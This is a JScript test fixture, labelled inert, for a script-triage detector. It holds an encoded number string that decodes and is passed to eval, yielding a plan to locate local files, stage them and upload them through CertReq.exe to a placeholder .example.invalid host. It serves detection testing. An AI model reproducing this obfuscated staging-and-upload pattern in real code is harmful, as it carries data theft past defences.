// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_62f9869f(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push((storedMaterial[i] + 1) % 256); }
  return recoveredMaterial;
}
function recover_06c007bd() {
  var packedText = "122-33-114-115-100-111-114-33-57-90-33-107-110-98-96-115-100-94-107-110-98-96-107-33-43-33-111-113-100-111-96-113-100-94-115-113-96-109-114-101-100-113-33-43-33-116-111-107-110-96-99-94-113-100-108-110-115-100-33-92-43-33-96-99-96-111-115-100-113-33-57-33-66-100-113-115-81-100-112-45-100-119-100-33-43-33-117-96-107-116-100-114-33-57-122-33-98-96-108-111-96-104-102-109-94-104-99-33-57-33-98-96-108-111-96-104-102-109-44-52-97-98-56-50-99-47-99-99-98-33-43-33-116-113-107-33-57-33-103-115-115-111-114-57-46-46-52-97-98-56-50-99-47-99-99-98-45-100-119-96-108-111-107-100-45-104-109-117-96-107-104-99-46-48-100-49-50-49-47-98-56-45-99-96-115-33-43-33-116-114-100-113-94-96-102-100-109-115-33-57-33-71-116-109-115-113-100-114-114-75-96-97-46-52-97-98-56-50-99-47-99-99-98-33-43-33-101-104-107-100-94-111-96-115-103-33-57-33-66-57-91-91-84-114-100-113-114-91-91-79-116-97-107-104-98-91-91-71-116-109-115-113-100-114-114-75-96-97-91-91-114-115-96-102-100-44-52-97-98-56-50-99-47-99-99-98-45-99-96-115-33-124-43-33-114-115-96-102-100-66-110-116-109-115-33-57-50-124";

  var packedParts = packedText.split("-");

  var storedMaterial = [];

  for (var di = 0; di < packedParts.length; di++) { storedMaterial.push(parseInt(packedParts[di], 10)); }



  var recoveredMaterial = [];

  try { recoveredMaterial = decode_62f9869f.call(null, storedMaterial); } catch (ignored) { recoveredMaterial = []; }

  var configurationText;

  configurationText = "";

  for (var bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }

  return configurationText;
}
function inspect_25382c0a() {
  var configuration = eval("(" + recover_06c007bd.call(null) + ")");
  var analysisPlan = new Object();
  analysisPlan.steps = configuration.steps;
  analysisPlan["adapter"] = configuration["adapter"];
  analysisPlan.values = configuration.values;
  analysisPlan["stageCount"] = configuration["stageCount"];
  return analysisPlan;
}
